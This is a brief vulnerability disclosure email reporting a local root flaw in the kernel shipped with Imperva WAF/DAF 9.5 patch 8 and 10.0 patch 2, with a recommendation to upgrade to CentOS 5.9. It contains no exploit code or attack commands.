Subject: Imperva WAF/DAF 9.5 patch8 and 10.0 patch 2
	localroot vulnerability

Imperva use hardened centos 5.4 to run Web Application Firewall and Database Activity Monitoring product.
It could be exploit to get root in the kernel 2.6.18-164.15.1.el5.imp4 which was built by imperva in 9.5 patch 8 and 10.0 patch 2.
I hope imperva could upgrade your OS to centos 5.9 with kernel 2.6.18-348 to keep your system secure.
Your can check the attachment for details.
